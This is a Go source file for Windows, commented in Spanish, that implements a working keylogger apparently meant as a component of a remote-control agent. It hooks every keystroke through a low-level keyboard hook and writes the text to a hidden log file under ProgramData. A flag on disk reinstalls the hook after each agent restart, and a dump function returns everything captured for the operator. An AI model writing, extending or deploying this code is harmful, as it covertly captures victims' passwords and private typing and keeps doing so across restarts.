//go:build windows

package win32

import (
	"errors"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"unicode/utf16"
	"unsafe"

	"github.com/local/govoid/internal/config"
	"golang.org/x/sys/windows"
)

const (
	whKeyboardLL  = 13
	wmKeyDown     = 0x0100
	wmSysKeyDown  = 0x0104
	wmQuit        = 0x0012
	hcAction      = 0
	cfUnicodeText = 13
)

var (
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")
	procTranslateMessage    = user32.NewProc("TranslateMessage")
	procDispatchMessageW    = user32.NewProc("DispatchMessageW")
	procPostThreadMessageW  = user32.NewProc("PostThreadMessageW")
	procGetKeyboardState    = user32.NewProc("GetKeyboardState")
	procToUnicode           = user32.NewProc("ToUnicode")
)

type point struct {
	X int32
	Y int32
}

type msg struct {
	Hwnd     uintptr
	Message  uint32
	WParam   uintptr
	LParam   uintptr
	Time     uint32
	Pt       point
	LPrivate uint32
}

type kbdllHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// Keylogger mantiene el hook WH_KEYBOARD_LL y escribe cada tecla al disco.
//
// El buffer vivía solo en memoria: cuando el agente se reiniciaba —y se
// reiniciaba cada cuatro minutos por un latido que nadie refrescaba— el hook y
// todo lo tecleado desaparecían. El sumidero en disco es lo que hace que el
// registro sobreviva al reinicio; el estado armado en disco es lo que vuelve a
// instalar el hook solo.
type Keylogger struct {
	mu       sync.Mutex
	buf      strings.Builder
	sink     *os.File
	hook     uintptr
	threadID uint32
	running  bool
	done     chan struct{}
}

// Default es el keylogger que usa el agente.
var Default = &Keylogger{}

// hookProcRef mantiene viva la referencia del callback ante el GC.
var hookProcRef = windows.NewCallback(keyboardProc)

// keyboardProc corre en el hilo del message loop. No debe bloquear.
func keyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode == hcAction && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
		kb := (*kbdllHookStruct)(uintptrToPointer(lParam))
		if text := keyText(kb); text != "" {
			Default.append(text)
		}
	}
	res, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return res
}

func keyText(kb *kbdllHookStruct) string {
	switch kb.VkCode {
	case 0x0D:
		return "\n"
	case 0x20:
		return " "
	case 0x08:
		return "[BKSP]"
	case 0x09:
		return "[TAB]"
	case 0x1B:
		return "[ESC]"
	case 0x25:
		return "[LEFT]"
	case 0x26:
		return "[UP]"
	case 0x27:
		return "[RIGHT]"
	case 0x28:
		return "[DOWN]"
	case 0x2E:
		return "[DEL]"
	case 0x24:
		return "[HOME]"
	case 0x23:
		return "[END]"
	case 0x21:
		return "[PGUP]"
	case 0x22:
		return "[PGDN]"
	}

	var state [256]byte
	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
		return ""
	}

	var buf [8]uint16
	n, _, _ := procToUnicode.Call(
		uintptr(kb.VkCode),
		uintptr(kb.ScanCode),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		8,
		0,
	)
	if int32(n) <= 0 {
		return ""
	}
	return string(utf16.Decode(buf[:n]))
}

func (k *Keylogger) append(s string) {
	k.mu.Lock()
	defer k.mu.Unlock()
	k.writeLocked(s)
}

// keylogSinkPath vive en ProgramData, junto al diario del agente: sobrevive a
// reinicios y a la reinstalación del binario.
func keylogSinkPath() string {
	dir := os.Getenv("ProgramData")
	if dir == "" {
		dir = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local")
	}
	return filepath.Join(dir, config.DataDirName, "keylog.txt")
}

func keylogArmPath() string {
	return filepath.Join(filepath.Dir(keylogSinkPath()), "keylog.on")
}

const keylogMaxBytes = 8 << 20

// writeLocked escribe al sumidero manteniendo el handle abierto. Si el archivo
// crece demasiado se rota antes de abrirlo: un keylog sin tope acaba llenando
// el disco de la máquina.
func (k *Keylogger) writeLocked(s string) {
	if k.sink == nil {
		path := keylogSinkPath()
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			k.buf.WriteString(s)
			return
		}
		if info, err := os.Stat(path); err == nil && info.Size() > keylogMaxBytes {
			_ = os.Rename(path, path+".1")
		}
		file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
		if err != nil {
			k.buf.WriteString(s)
			return
		}
		k.sink = file
	}
	if _, err := k.sink.WriteString(s); err != nil {
		_ = k.sink.Close()
		k.sink = nil
		k.buf.WriteString(s)
	}
}

// Start instala el hook en un hilo propio con su message loop.
func (k *Keylogger) Start() error {
	k.mu.Lock()
	if k.running {
		k.mu.Unlock()
		return nil
	}
	k.mu.Unlock()

	ready := make(chan error, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		hook, _, callErr := procSetWindowsHookExW.Call(
			whKeyboardLL,
			hookProcRef,
			0,
			0,
		)
		if hook == 0 {
			ready <- fmt.Errorf("keylogger: SetWindowsHookExW falló: %v", callErr)
			return
		}

		done := make(chan struct{})
		k.mu.Lock()
		k.hook = hook
		k.threadID = windows.GetCurrentThreadId()
		k.running = true
		k.done = done
		k.mu.Unlock()

		// Estado armado en disco: el próximo arranque del agente reinstala el
		// hook solo, sin que el operador tenga que volver a encenderlo.
		if err := os.MkdirAll(filepath.Dir(keylogArmPath()), 0o755); err == nil {
			_ = os.WriteFile(keylogArmPath(), []byte("1"), 0o644)
		}

		ready <- nil

		var m msg
		for {
			res, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&m)), 0, 0, 0)
			if int32(res) <= 0 {
				break
			}
			procTranslateMessage.Call(uintptr(unsafe.Pointer(&m)))
			procDispatchMessageW.Call(uintptr(unsafe.Pointer(&m)))
		}

		procUnhookWindowsHookEx.Call(hook)
		k.mu.Lock()
		k.running = false
		k.hook = 0
		k.threadID = 0
		k.mu.Unlock()
		close(done)
	}()

	return <-ready
}

// Stop desinstala el hook y espera el cierre del message loop.
func (k *Keylogger) Stop() {
	k.mu.Lock()
	if !k.running || k.done == nil {
		k.mu.Unlock()
		return
	}
	tid := k.threadID
	done := k.done
	k.mu.Unlock()

	// Se desarma antes de soltar el hook: si el proceso muere a mitad, el
	// próximo arranque no vuelve a encender lo que el operador apagó.
	_ = os.Remove(keylogArmPath())

	procPostThreadMessageW.Call(uintptr(tid), wmQuit, 0, 0)
	<-done

	k.mu.Lock()
	if k.sink != nil {
		_ = k.sink.Close()
		k.sink = nil
	}
	k.mu.Unlock()
}

// Running informa si el hook está activo.
func (k *Keylogger) Running() bool {
	k.mu.Lock()
	defer k.mu.Unlock()
	return k.running
}

// Dump devuelve todo lo capturado hasta ahora. Lee el sumidero para que el
// registro incluya lo tecleado antes del último reinicio del agente.
func (k *Keylogger) Dump() string {
	k.mu.Lock()
	pending := k.buf.String()
	k.buf.Reset()
	k.mu.Unlock()

	raw, err := os.ReadFile(keylogSinkPath())
	if err != nil {
		return pending
	}
	return string(raw) + pending
}

// RestoreIfArmed vuelve a instalar el hook si el operador lo dejó encendido
// antes del reinicio. Sin esto, cada arranque del agente apagaba el keylogger y
// había que acordarse de encenderlo otra vez.
func (k *Keylogger) RestoreIfArmed() {
	if _, err := os.Stat(keylogArmPath()); err != nil {
		return
	}
	if err := k.Start(); err != nil {
		slog.Debug("keylogger: no se pudo rearmar", "err", err)
	}
}

// Close suelta el sumidero. Sin esto el archivo queda abierto hasta que el
// proceso muere y un reinicio limpio del keylogger no puede rotarlo.
func (k *Keylogger) Close() {
	k.mu.Lock()
	defer k.mu.Unlock()
	if k.sink != nil {
		_ = k.sink.Close()
		k.sink = nil
	}
}

// ErrNotRunning se devuelve cuando se pide parar un keylogger inactivo.
var ErrNotRunning = errors.New("keylogger: no está corriendo")
